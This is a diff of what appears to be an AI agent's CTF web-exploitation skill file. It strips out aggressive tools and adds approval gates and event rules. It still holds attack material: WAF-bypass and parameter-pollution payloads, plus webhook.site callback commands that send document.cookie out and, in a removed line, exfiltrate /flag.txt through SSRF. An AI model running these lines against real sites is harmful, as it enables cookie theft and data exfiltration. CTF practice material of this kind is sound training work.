@@ -21,7 +21,7 @@ Before installing anything below, check whether the tool/package already exists 
 
 **Python packages (all platforms):**
 ```bash
-pip install sqlmap flask-unsign requests httpx
+pip install flask-unsign requests httpx
 ```
 
 **Linux (apt):**
@@ -34,18 +34,10 @@ apt install hashcat jq curl
 brew install hashcat jq curl
 ```
 
-**Go tools (all platforms, requires Go):**
-```bash
-go install github.com/ffuf/ffuf/v2@latest
-```
-
 **Manual install:**
 - ysoserial — [GitHub](https://github.com/frohoff/ysoserial), requires Java (Java deserialization payloads)
-- PayloadsAllTheThings — git clone to ctf-web/payloads/PayloadsAllTheThings (auto via install script or lazy clone)
+- PayloadsAllTheThings — git clone to ctf-web/payloads/PayloadsAllTheThings (on demand)
   ```bash
-  bash scripts/install_ctf_tools.sh pat   # PAT only
-  bash scripts/install_ctf_tools.sh all   # all tools including PAT
-  # manual fallback:
   git clone --depth 1 https://github.com/swisskyrepo/PayloadsAllTheThings.git ctf-web/payloads/PayloadsAllTheThings
   ```
   > PAT is optional and on-demand — not required at load time. The skill works without it (graceful degrade): `pat-reference.md` provides an offline index with exemplar payloads; bulk wordlists require the clone above.
@@ -74,8 +66,8 @@ go install github.com/ffuf/ffuf/v2@latest
 - [web3.md](web3.md) - Solidity and Web3 challenge notes
 - [cves.md](cves.md) - CVE-driven techniques you can match against challenge banners, headers, dependency leaks, or version strings
 - [field-notes.md](field-notes.md) - Long-form exploit notes: quick references for SQLi, XSS, LFI, JWT, SSTI, SSRF, command injection, XXE, deserialization, race conditions, auth bypass, and multi-stage chains
-- [tools-mcp.md](tools-mcp.md) - MCP server integration for web: Playwright MCP (admin-bot DOM XSS reproduction, live DOM/console/network inspection, `browser_network_requests` lists endpoints but only `browser_network_request part="response-body"` returns payloads) and Burp Suite official MCP (27 tools, approval gates that block the agent on a modal dialog, target triple decoupling socket from `Host:` header, `normalizeHttpContent` rewriting CR/LF in the request prelude, map-based HTTP/2 that cannot express duplicate headers, `send_to_intruder` stages only, proxy history truncating items at 5000 chars, Collaborator `payloadId`/`customData` Pro-only); when to use each vs curl and ffuf
-- [python-requests.md](python-requests.md) - Python requests toolkit: session scaffold, Burp-Intruder-like fuzzer (sync + ThreadPoolExecutor + httpx async), payload deploy from pat-reference.md wordlists, header/param spray, cookie/JWT, proxy
+- [tools-mcp.md](tools-mcp.md) - MCP server integration for web: Playwright MCP (admin-bot DOM XSS reproduction, live DOM/console/network inspection, `browser_network_requests` lists endpoints but only `browser_network_request part="response-body"` returns payloads) and Burp Suite official MCP (27 tools, approval gates that block the agent on a modal dialog, target triple decoupling socket from `Host:` header, `normalizeHttpContent` rewriting CR/LF in the request prelude, map-based HTTP/2 that cannot express duplicate headers, `send_to_intruder` stages only, proxy history truncating items at 5000 chars, Collaborator `payloadId`/`customData` Pro-only); when to use each vs curl and scripted requests
+- [python-requests.md](python-requests.md) - Python requests toolkit: session scaffold, payload deploy from pat-reference.md wordlists, header/param spray, cookie/JWT, proxy. `scripts/async_fuzz.py` (100 concurrent) is a bulk fuzzer — ASK FIRST, never a default step mid-event
 - [pat-reference.md](pat-reference.md) — PayloadsAllTheThings index: bulk payloads for XSS/SQLi/SSRF/SSTI/LFI/Command Injection/Upload (requires PAT clone, see Prerequisites)
 
 ## When to Pivot
@@ -86,19 +78,23 @@ go install github.com/ffuf/ffuf/v2@latest
 - If the web challenge involves analyzing logs, PCAPs, or recovering artifacts from a web server, switch to `/ctf-forensics`.
 - If the challenge requires gathering intelligence from public web sources, DNS records, or social media before exploitation, switch to `/ctf-osint`.
 
-## Find Similar Writeups
+## Similar Writeups — ASK FIRST
 
-If you are stuck or want to see how others solved similar web challenges, follow the ctf-similar-search skill's methodology — describe the search request in natural language using the challenge name, competition name, or unique strings (code snippets, error messages) from the challenge:
+**Never search for writeups of the current event (forbidden by project rules).** For a practice challenge, ask the user first; if approved, follow the `/ctf-similar-search` skill (Tavily API) with challenge-specific identifiers — competition + challenge name (≤3 words) or unique code/error strings, never generic terms like "SSRF" or "XSS". Everything you send goes to a third-party API.
 
-"DASCTF URL Storage"
-"def encrypt_flag(key)"
+## Event-safe default
 
-This searches for reference writeups via Tavily API and can help identify the right exploitation path. Avoid generic terms like "SSRF" or "XSS" — use challenge-specific identifiers instead.
+No sqlmap/ffuf/gobuster/dir busting/high-volume fuzzing against challenge hosts (project rules — ASK FIRST, and never as a default step). Default: read the source, hand-craft single requests, hunt parser mismatches. High-value patterns (details: [server-side.md](server-side.md), [server-side-advanced.md](server-side-advanced.md), [node-and-prototype.md](node-and-prototype.md)):
+
+- Node `fs.readFileSync(user)` + WAF: Express `file[a]=` builds an object; Node duck-types URLs (`.href` + `.origin`) — `?file[protocol]=file:&file[hostname]=&file[pathname]=fla%2567.txt`; double-encode banned substrings (`%2567` → `g`).
+- `qs`/Express `parameterLimit=1000`: if a proxy appends `&proxy=nginx`, send ≥1000 params so the append is dropped.
+- Cross-language HPP: Flask `request.form.get` takes the **first** value, PHP `$_POST` the **last** — send `tier=allowed&tier=gold` when middleware forwards the raw body.
+- PHP filter prefix gate: generate a `php://filter` chain that *prepends* the required bytes (e.g. `FREE`), then read the gated resource.
 
 ## First-Pass Workflow
 
 1. Identify the real boundary: browser only, backend only, mixed app, or auth flow.
-2. Capture one normal request/response pair for every major feature before fuzzing.
+2. Capture one normal request/response pair for every major feature before deeper probing.
 3. Enumerate hidden functionality from JS bundles, response headers, routes, and alternate methods.
 4. Classify the likely bug family: injection, authz, parser mismatch, upload, trust proxy, state machine, or client-side execution.
 5. Build the smallest proof first: leak, bypass, or primitive. Save full exploit chaining for later.
@@ -129,13 +125,9 @@ If `ctf-web/payloads/PayloadsAllTheThings/.git` is missing, the agent lazy-clone
 ## Quick Start Commands
 
 ```bash
-# Recon
+# Recon (manual, low-volume)
 curl -sI https://target.com
-ffuf -u https://target.com/FUZZ -w wordlist.txt
 curl -s https://target.com/robots.txt
-
-# SQLi quick test
-sqlmap -u "https://target.com/page?id=1" --batch --dbs
 
 # JWT decode (no verification)
 echo '<token>' | cut -d. -f2 | base64 -d 2>/dev/null | jq .
@@ -202,7 +194,7 @@ For complex scenarios (CSRF tokens, frontend encryption, JSON APIs, Basic Auth, 
 
 ## Webhook Callbacks (webhook.site)
 
-For an exploit that needs a callback URL (XSS admin bot, SSRF exfiltration, OAuth redirect abuse, blind injection with out-of-band data), [webhook.site](https://webhook.site) can receive and show incoming requests. **It is a third-party service: anything sent there leaves your machine. Ask the user before using it, never send flags or challenge data to it unprompted, and prefer a local listener when the target can reach one.**
+**ASK FIRST — webhook.site and similar callback services are third parties: anything sent there leaves your machine. They are not a default step and need the user's approval (never mid-event without it); never send flags or challenge data.** For an exploit that needs a callback URL (XSS admin bot, SSRF exfiltration, OAuth redirect abuse, blind OOB), prefer a local listener the target can reach (`python3 -m http.server`, Burp Collaborator). Reference commands, for use only after approval:
 
 **Create a token (get a callback URL):**
 ```bash
@@ -218,8 +210,8 @@ curl -X POST https://target.com/api/report \
   -H "Content-Type: application/json" \
   -d '{"url": "https://webhook.site/<uuid>/steal?cookie=" + document.cookie}'
 
-# SSRF exfiltration via webhook
-curl "https://target.com/ssrf?url=https://webhook.site/<uuid>/?data=$(cat /flag.txt | base64)"
+# SSRF exfiltration via webhook (marker data only — never real flag bytes)
+curl "https://target.com/ssrf?url=https://webhook.site/<uuid>/?data=<exfil-marker>"
 
 # OAuth redirect abuse
 curl "https://target.com/auth?redirect=https://webhook.site/<uuid>/token"
